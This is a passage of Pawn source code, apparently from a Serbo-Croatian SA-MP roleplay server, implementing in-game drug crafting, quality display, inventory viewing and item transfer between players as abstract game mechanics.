			if( crvenif < 1 || crvenif > PlayerInfo[ playerid ][ xCrveniF ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu crvenog fosfora kod sebe!");
	        if( solna != 8) razlika += (random(20-10)+solna);
			if( sodab != 2) razlika += (random(20-10)+sodab);
			if( crvenif != 10) razlika += (random(20-10)+crvenif);
			if( metila != 11) razlika += (random(20-10)+metila);
			PlayerInfo[ playerid ][ xSolna ] -= solna;
			PlayerInfo[ playerid ][ xMetilAmin ] -= metila;
			PlayerInfo[ playerid ][ xSodaB ] -= sodab;
			PlayerInfo[ playerid ][ xCrveniF ] -= crvenif;
			if( IsABlueMeth( 6999-razlika ) ) {
	        	PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 6999-razlika;
	            PlayerInfo[ playerid ][ xDrug ][ slot2 ] = (random(10-5)+5);

				SendInfoMessage( playerid, "Napravili ste %d grama blue metamfetamina.", PlayerInfo[ playerid ][ xDrug ][ slot2 ] );

			} else {
				SCM( playerid, ZUTA, "Smesa vam nije uspjela!");
			}
			return 1;
		} 
		else if(strcmp(opcija,"crack",true) == 0) {
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_CRACK ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    new skokain, skokain2, kkokain, desvoda, sodab, razlika = 0;
		    if( sscanf(params, "s[32]s[20]iiiii", item, opcija, slot, skokain, kkokain, desvoda, sodab ) ) return SendUsageMessage( playerid, "/droga napravi crack [slot nove droge ] [slot gde je kokain] [kolicinu kokaina] [des. voda] [soda b.]");
			if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
			skokain2 = skokain-1;
			if( PlayerInfo[ playerid ][ xDrugCode ][ skokain2 ] == 0) return SendErrorMessage( playerid, "Taj slot je prazan!");
			if( !IsACocaine( PlayerInfo[ playerid ][ xDrugCode ][ skokain2 ] ) ) return SendErrorMessage( playerid, "U tom slotu nema kokaina." );
			if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] != 0) return SendErrorMessage( playerid, "Taj slot je pun!");
			if( desvoda < 1 || desvoda > PlayerInfo[ playerid ][ xDesVoda ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu destilovane vode kod sebe!");
			if( kkokain < 10 || kkokain > 15 || kkokain > PlayerInfo[ playerid ][ xDrug ][ skokain2 ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu kokaina kod sebe/ne moze ispod 10 ili iznad 15!");
			if( sodab < 1 || sodab > PlayerInfo[ playerid ][ xSodaB ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu sode bikarbone kod sebe!");
            if( sodab != 2 ) razlika += (random(20-10)+desvoda);
			if( desvoda != 8 ) razlika += (random(20-10)+sodab);
			PlayerInfo[ playerid ][ xDesVoda ] -= desvoda;
			PlayerInfo[ playerid ][ xDrug ][ skokain2 ] -= kkokain;
			PlayerInfo[ playerid ][ xSodaB ] -= sodab;
			if( IsACrack( 7999-razlika ) ) {
	        	PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 7999-razlika;
	            PlayerInfo[ playerid ][ xDrug ][ slot2 ] = kkokain;

				SendInfoMessage( playerid, "Napravili ste %dg cracka.", PlayerInfo[ playerid ][ xDrug ][ slot2 ] );

			} else {
				SCM( playerid, ZUTA, "Smesa vam nije uspjela!");
			}
			if( PlayerInfo[ playerid ][ xDrug ][ skokain2 ] == 0)
				PlayerInfo[ playerid ][ xDrugCode ][ skokain2 ] = 0;
			return 1;
		}
		else if(strcmp(opcija,"heroin",true) == 0) {
		    if( inProperty[ playerid ] == -1 && inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u vasoj kuci/stanu/vikendici ili intu orge." );
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_HEROIN ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    new opium, sodab, desvoda, kalcijum, amonijum, razlika = 0;
		    if( sscanf(params, "s[32]s[20]iiiiii", item, opcija, slot, opium, sodab, desvoda, kalcijum, amonijum ) ) return SendUsageMessage( playerid, "/droga napravi heroin [slot] [opium] [soda b.] [des. voda] [kaljicum] [amonijum hlorid]");
			if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
			if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] != 0) return SendErrorMessage( playerid, "Taj slot je pun!");
			if( desvoda < 1 || desvoda > PlayerInfo[ playerid ][ xDesVoda ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu destilovane vode kod sebe!");
			if( opium < 1 || opium > PlayerInfo[ playerid ][ xOpium ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu opijuma kod sebe!");
			if( sodab < 1 || sodab > PlayerInfo[ playerid ][ xSodaB ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu sode bikarbone kod sebe!");
            if( kalcijum < 1 || kalcijum > PlayerInfo[ playerid ][ xKalcij ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu kalcijuma kod sebe!");
			if( amonijum < 1 || amonijum > PlayerInfo[ playerid ][ xAmonijH ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu amonijum hlorida kod sebe!");
			if( opium < 1000 || opium > 1500 ) return SendErrorMessage( playerid, "Opium se moze kretati od 1000 do 1500." );
			razlika += desvoda;
			razlika += sodab;
			razlika += opium;
			razlika += kalcijum;
			razlika += amonijum;
			PlayerInfo[ playerid ][ xDesVoda ] -= desvoda;
			PlayerInfo[ playerid ][ xOpium ] -= opium;
			PlayerInfo[ playerid ][ xSodaB ] -= sodab;
			PlayerInfo[ playerid ][ xKalcij ] -= kalcijum;
			PlayerInfo[ playerid ][ xAmonijH ] -= amonijum;
			if( IsAHeroin( 6999-razlika ) ) {
			
	        	PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 6999-razlika;
	            PlayerInfo[ playerid ][ xDrug ][ slot2 ] = 250;

				SendInfoMessage( playerid, "Napravili ste %dg heroina .", PlayerInfo[ playerid ][ xDrug ][ slot2 ] );

			} else {
				SCM( playerid, ZUTA, "Smesa vam nije uspjela!");
			}
			return 1;
		}
		else if(strcmp(opcija,"kokain",true) == 0) {
		    if( inProperty[ playerid ] == -1 && inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u vasoj kuci/stanu/vikendici ili intu orge." );
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_KOKAIN ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    new kokain, desvoda, sodab, razlika = 0;
		    if( sscanf(params, "s[32]s[20]iiii", item, opcija, slot, kokain, desvoda, sodab ) ) return SendUsageMessage( playerid, "/droga napravi kokain [slot] [kokain] [des. voda] [soda b.]");
			if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
			if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] != 0) return SendErrorMessage( playerid, "Taj slot je pun!");
			if( desvoda < 1 || desvoda > PlayerInfo[ playerid ][ xDesVoda ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu destilovane vode kod sebe!");
			if( kokain < 1 || kokain > PlayerInfo[ playerid ][ xKokain ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu osusenog kokaina kod sebe!");
			if( sodab < 1 || sodab > PlayerInfo[ playerid ][ xSodaB ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu sode bikarbone kod sebe!");
            razlika += (random(20-10)+desvoda);
			razlika += (random(20-10)+sodab);
			razlika += (random(20-10)+kokain);
			PlayerInfo[ playerid ][ xDesVoda ] -= desvoda;
			PlayerInfo[ playerid ][ xKokain ] -= kokain;
			PlayerInfo[ playerid ][ xSodaB ] -= sodab;
			if( IsACocaine( 6088-razlika ) ) {
	        	PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 6088-razlika;
	            PlayerInfo[ playerid ][ xDrug ][ slot2 ] = (random(4)+10);

				SendInfoMessage( playerid, "Napravili ste %dg kokaina.", PlayerInfo[ playerid ][ xDrug ][ slot2 ] );

			} else {
				SCM( playerid, ZUTA, "Smesa vam nije uspjela!");
			}
			return 1;
		}
		else if(strcmp(opcija,"lsd",true) == 0) {
		    if( inProperty[ playerid ] == -1 && inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u vasoj kuci/stanu/vikendici ili intu orge." );
		    new lysacid, desvoda, sodab, razlika = 0;
		    if( sscanf(params, "s[32]s[20]iiii", item, opcija, slot, lysacid, desvoda, sodab ) ) return SendUsageMessage( playerid, "/droga napravi lsd [slot] [lys. acid] [des. voda] [soda b.]");
			if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
			if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] != 0) return SendErrorMessage( playerid, "Taj slot je pun!");
			if( desvoda < 1 || desvoda > PlayerInfo[ playerid ][ xDesVoda ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu destilovane vode kod sebe!");
			if( lysacid < 1 || lysacid > PlayerInfo[ playerid ][ xLysAcid ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu Lysergic acida kod sebe!");
			if( sodab < 1 || sodab > PlayerInfo[ playerid ][ xSodaB ] ) return SendErrorMessage( playerid, "Nemate toliku kolicinu sode bikarbone kod sebe!");
            if( desvoda != 19 ) razlika += (random(20-10)+desvoda);
			if( sodab != 2 ) razlika += (random(20-10)+sodab);
			if( lysacid != 7 ) razlika += (random(20-10)+lysacid);
			PlayerInfo[ playerid ][ xDesVoda ] -= desvoda;
			PlayerInfo[ playerid ][ xLysAcid ] -= lysacid;
			PlayerInfo[ playerid ][ xSodaB ] -= sodab;
			if( IsALSD( 2999-razlika ) ) {
	        	PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] = 2999-razlika;
	            PlayerInfo[ playerid ][ xDrug ][ slot2 ] = (random(3)+3);

				SendInfoMessage( playerid, "Napravili ste %d tabletica lsda.", PlayerInfo[ playerid ][ xDrug ][ slot2 ] );

			} else {
				SCM( playerid, ZUTA, "Smesa vam nije uspjela!");
			}
			return 1;
		}
		return 1;
	}
	else if( strcmp( item, "show", true ) == 0 ) {
	    if( sscanf( params, "s[32]i", item, slot)) return SendUsageMessage( playerid, "/droga show [slot]");
	    if(slot < 1 || slot > 5) return SendErrorMessage( playerid, "Krivi broj slota!");
	    slot2 = slot-1;
	    if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ]  == 0) return SendErrorMessage( playerid, "Taj slot vam je prazan!");
        if( IsAMarijuana( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
            format( globalstring, sizeof( globalstring ), "* %s vadi kesicu sa marihuanom odlicne kvalitete.", ImeIgraca( playerid ) );
		    PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		}
		if( IsALSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    format( globalstring, sizeof( globalstring ), "* %s vadi tabletice LSD-a.", ImeIgraca( playerid ) );
		    PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		    if( IsAStrongLSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		        format( globalstring, sizeof( globalstring ), "* na tabletici se vidi da nema gresaka, djeluje perfektno (very good) (( %s )).", ImeIgraca( playerid ) );
		        PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
            }
		    if( IsAGoodLSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )  {
		    	format( globalstring, sizeof( globalstring ), "* na tabletici se vidi da je dobre strukture, djeluje kvalitetno (good) (( %s )).", ImeIgraca( playerid ) );
		        PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
            }
		    if( IsABadLSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )  {
		    	format( globalstring, sizeof( globalstring ), "* na tabletici se vidi da nije ciste strukture, i ne djeluje kvalitetno (bad) (( %s )).", ImeIgraca( playerid ) );
		        PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
            }
		    if( IsAVeryBadLSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )  {
		    	format( globalstring, sizeof( globalstring ), "* na tabletici se vidi da je vrlo lose strukture, i djeluje vrlo nekvalitetno (very bad) (( %s )).", ImeIgraca( playerid ) );
		        PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
			}
		}
		if( IsACocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    format( globalstring, sizeof( globalstring ), "* %s vadi kesicu kokaina.", ImeIgraca( playerid ) );
		    PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		    if( IsAStrongCocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* u prahu se vidi da je potpuno cist, bez primjesa (very good) (( %s )).", ImeIgraca( playerid ) );
		    if( IsAGoodCocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* u prahu bi se vidjelo da je cist, te sadrzi nekolicinu primjesa (good) (( %s )).", ImeIgraca( playerid ) );
		    if( IsABadCocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* u prahu bi se vidjeli da je necist, te sadrzi malo primjesa (bad) (( %s )).", ImeIgraca( playerid ) );
		    if( IsAVeryBadCocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* u prahu bi se vidjelo da je necist, te sadrzi pretjerano dosta primjesa (very bad) (( %s )).", ImeIgraca( playerid ) );
            PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		}
		if( IsACrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    format( globalstring, sizeof( globalstring ), "* %s vadi kesicu cracka.", ImeIgraca( playerid ) );
		    PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		    if( IsAStrongCrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* boja cracka je perfektna, i izgleda perfektno (very good) (( %s )).", ImeIgraca( playerid ) );
		    if( IsAGoodCrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* boja cracka bi se cinila dobrom, i izgleda kvalitetno (good) (( %s )).", ImeIgraca( playerid ) );
		    if( IsABadCrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* boja cracka ne pogada original, i ne izgleda kvalitetno (bad) (( %s )).", ImeIgraca( playerid ) );
		    if( IsAVeryBadCrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* boja cracka bi bila dosta neprirodna, i ne izgleda kvalitetno (very bad) (( %s )).", ImeIgraca( playerid ) );
            PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		}
		if( IsAHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    format( globalstring, sizeof( globalstring ), "* %s vadi heroin.", ImeIgraca( playerid ) );
		    PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		    if( IsAStrongHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* boja heroina odgovara normalnoj, te se primjeti perfektnost (very good) (( %s )).", ImeIgraca( playerid ) );
		    if( IsAGoodHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* boja heroina izgleda svijetlije, te se primjeti kvalitetnost (good) (( %s )).", ImeIgraca( playerid ) );
		    if( IsABadHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* boja heroina bi bila tamna, te se primjeti nekvalitetnost (bad) (( %s )).", ImeIgraca( playerid ) );
		    if( IsAVeryBadHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* boja heroina bi bila veoma tamna, te se primjeti nekvalitetnost (very bad) (( %s )).", ImeIgraca( playerid ) );
            PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		}
		if( IsABlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    format( globalstring, sizeof( globalstring ), "* %s vadi blue meth.", ImeIgraca( playerid ) );
		    PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		    if( IsAStrongBlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* na kristalicima se ne primjecuju neprozirnosti, velicina je perfektna (very good) (( %s )).", ImeIgraca( playerid ) );
		    if( IsAGoodBlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* na kristalicima se negdje vide neke neprozirnosti, velicina je dobra (good) (( %s )).", ImeIgraca( playerid ) );
		    if( IsABadBlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
                format( globalstring, sizeof( globalstring ), "* na kristalicima se vidi da su neprozirni, te su srednje velicine (bad) (( %s )).", ImeIgraca( playerid ) );
		    if( IsAVeryBadBlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* na kristalicima se vide da su veoma neprozirni, te su mali velicinom (very bad) (( %s )).", ImeIgraca( playerid ) );
            PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		}
		if( IsAMethamphetamine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    format( globalstring, sizeof( globalstring ), "* %s vadi blue meth.", ImeIgraca( playerid ) );
		    PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		    if( IsAStrongMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* na kristalicima se ne primjecuju neprozirnosti, velicina je perfektna (very good) (( %s )).", ImeIgraca( playerid ) );
		    if( IsAGoodMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* na kristalicima se negdje vide neke neprozirnosti, velicina je dobra (good) (( %s )).", ImeIgraca( playerid ) );
		    if( IsABadMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
                format( globalstring, sizeof( globalstring ), "* na kristalicima se vidi da su neprozirni, te su srednje velicine (bad) (( %s )).", ImeIgraca( playerid ) );
		    if( IsAVeryBadMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	format( globalstring, sizeof( globalstring ), "* na kristalicima se vide da su veoma neprozirni, te su mali velicinom (very bad) (( %s )).", ImeIgraca( playerid ) );
            PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		}
		return 1;
	}
	else if( strcmp( item, "test",true) == 0)
	{
	    if( sscanf( params, "s[32]i", item, slot)) return SendUsageMessage( playerid, "/droga test [slot]");
	    if(slot < 1 || slot > 5) return SendErrorMessage( playerid, "Krivi broj slota!");
	    slot2 = slot-1;
	    if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ]  == 0) return SendErrorMessage( playerid, "Taj slot vam je prazan!");
		if( IsAMarijuana( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    SendInfoMessage( playerid, "Kvaliteta marihuane: Odlicna");
        if( IsALSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    if( IsAStrongLSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta LSD-a: Odlicna");
		    if( IsAGoodLSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta LSD-a: Dobra");
		    if( IsABadLSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta LSD-a: Losa");
		    if( IsAVeryBadLSD( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta LSD-a: Vrlo losa");
		}
		if( IsACocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    if( IsAStrongCocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Kokaina: Odlicna");
		    if( IsAGoodCocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Kokaina: Dobra");
		    if( IsABadCocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Kokaina: Losa");
		    if( IsAVeryBadCocaine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Kokaina: Vrlo losa");
		}
		if( IsABlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    if( IsAStrongBlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Blue Metamfetamina: Odlicna");
		    if( IsAGoodBlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Blue Metamfetamina: Dobra");
		    if( IsABadBlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Blue Metamfetamina: Losa");
		    if( IsAVeryBadBlueMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Blue Metamfetamina: Vrlo losa");
		}
		if( IsACrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    if( IsAStrongCrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Cracka: Odlicna");
		    if( IsAGoodCrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Cracka: Dobra");
		    if( IsABadCrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Cracka: Losa");
		    if( IsAVeryBadCrack( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Cracka: Vrlo losa");
		}
		if( IsAMethamphetamine( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    if( IsAStrongMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Metamfetamina: Odlicna");
		    if( IsAGoodMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		        SendInfoMessage( playerid, "Kvaliteta Metamfetamina: Dobra");
		    if( IsABadMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		        SendInfoMessage( playerid, "Kvaliteta Metamfetamina: Losa");
		    if( IsAVeryBadMeth( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		        SendInfoMessage( playerid, "Kvaliteta Metamfetamina: Vrlo losa");
		}
		if( IsAHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) ) {
		    if( IsAStrongHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Heroina: Odlicna");
		    if( IsAGoodHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Heroina: Dobra");
		    if( IsABadHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Heroina: Losa");
		    if( IsAVeryBadHeroin( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) )
		    	SendInfoMessage( playerid, "Kvaliteta Heroina: Vrlo losa");
		}
		return 1;
    }
    else if( strcmp( item, "view",true) == 0)
    {
        SCM( playerid, SVETLOPLAVA, "[_________________________ MOJE DROGE _________________________=]");
        format( globalstring, sizeof( globalstring ), "Slot 1: [%s(%d g)]", GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ 0 ] ), PlayerInfo[ playerid ][ xDrug ][ 0 ] );
		SCM( playerid, BELA, globalstring);
		format( globalstring, sizeof( globalstring ), "Slot 2: [%s(%d g)]", GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ 1 ] ), PlayerInfo[ playerid ][ xDrug ][ 1 ] );
		SCM( playerid, BELA, globalstring);
		format( globalstring, sizeof( globalstring ), "Slot 3: [%s(%d g)]", GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ 2 ] ), PlayerInfo[ playerid ][ xDrug ][ 2 ] );
		SCM( playerid, BELA, globalstring);
		format( globalstring, sizeof( globalstring ), "Slot 4: [%s(%d g)]", GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ 3 ] ), PlayerInfo[ playerid ][ xDrug ][ 3 ] );
		SCM( playerid, BELA, globalstring);
		format( globalstring, sizeof( globalstring ), "Slot 5: [%s(%d g)]", GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ 4 ] ), PlayerInfo[ playerid ][ xDrug ][ 4 ] );
		SCM( playerid, BELA, globalstring);
		SCM( playerid, SVETLOPLAVA, "[______________________________________________________________=]");
		return 1;
	}
	else if( strcmp( item, "give",true) == 0)
    {
		if( sscanf( params, "s[32]uii", item, igrac, slot, kolicina ) ) {
			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			SendUsageMessage( playerid, "/droga give [ ID/Deo imena ] [slot] [kolicina]");
	     	SCM( playerid, BELA, "[Pomoc] Slot znaci broj vaseg mjesta droge, moze biti od 1 do 5.");
	     	SCM( playerid, BELA, "[Pomoc] Ukucajte /droga view ako zelite vidjeti slot vase droge!");
	        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			return 1;
		}
		if( IsPlayerConnected( igrac ) ) {
	 		if( igrac != INVALID_PLAYER_ID ) {
	 		    if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati drogu!");
	 		    slot2 = slot-1;
				if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
					if(PlayerInfo[ igrac ][ xDrugCode ][ 0 ] != 0 && PlayerInfo[ igrac ][ xDrugCode ][ 1 ] != 0 && PlayerInfo[ igrac ][ xDrugCode ][ 2 ] != 0 && PlayerInfo[ igrac ][ xDrugCode ][ 3 ] != 0 && PlayerInfo[ igrac ][ xDrugCode ][ 4 ] != 0 )
				    {
				        return SendErrorMessage( playerid, "Taj igrac nema slobodnih drugs slotova!");
					}
					if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Broj slota ne moze biti manji od 1 i veci od 5!");
			        if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] == 0) return SendErrorMessage( playerid, "Taj drug slot vam je prazan!");
					if( kolicina < 1 || kolicina > 100 ) return SendErrorMessage( playerid, "Kolicina ne moze biti manja od 1 i veca od 100!");
					if( PlayerInfo[ playerid ][ xDrug ][slot2] < kolicina ) return SendErrorMessage( playerid, "Nemate toliko droge pod tim slotom!");
					format( globalstring, sizeof( globalstring ), "%s vam je dao %d grama %s", ImeIgraca( playerid ), kolicina, GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) );
			        SCM( igrac, ZUTA, globalstring );
			        format( globalstring, sizeof( globalstring ), "Dali ste %s %d grama %s", ImeIgraca( igrac ), kolicina, GetDrugNameByDrugID( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] ) );
			        SCM( playerid, ZUTA, globalstring );
			        if( PlayerInfo[ igrac ][ xDrugCode ][ 0 ] == 0)
			        {
                        PlayerInfo[ igrac ][ xDrugCode ][ 0 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
                        PlayerInfo[ igrac ][ xDrug ][ 0 ] = kolicina;
					}
			        else if( PlayerInfo[ igrac ][ xDrugCode ][ 1 ] == 0)
			        {
                        PlayerInfo[ igrac ][ xDrugCode ][ 1 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
                        PlayerInfo[ igrac ][ xDrug ][ 1 ] = kolicina;
					}
			        else if( PlayerInfo[ igrac ][ xDrugCode ][ 2 ] == 0)
			        {
                        PlayerInfo[ igrac ][ xDrugCode ][ 2 ] = PlayerInfo[ playerid ][ xDrugCode ][ slot2 ];
                        PlayerInfo[ igrac ][ xDrug ][ 2 ] = kolicina;
					}
			        else if( PlayerInfo[ igrac ][ xDrugCode ][ 3 ] == 0)
			        {
